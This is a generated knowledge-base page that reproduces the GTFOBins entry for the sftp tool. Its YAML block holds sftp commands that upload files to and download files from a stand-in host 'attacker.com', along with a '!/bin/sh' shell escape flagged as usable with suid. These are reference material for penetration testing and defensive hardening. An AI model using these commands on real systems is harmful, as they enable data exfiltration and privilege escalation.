---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# sftp

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `sftp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sftp` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [sftp](../../tools/linux/sftp.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | sftp |
| name | sftp |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/sftp/ |

## Preserved Source Material

```yaml
_body: ''
_name: sftp
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sftp
functions:
  download:
  - code: 'sftp user@attacker.com

      get /path/to/input-file /path/to/output-file'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: ssh-server
  shell:
  - code: 'sftp user@attacker.com

      !/bin/sh'
    comment: This still requires a successfull connection to the server.
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  upload:
  - code: 'sftp user@attacker.com

      put /path/to/input-file /path/to/output-file'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: ssh-server
```
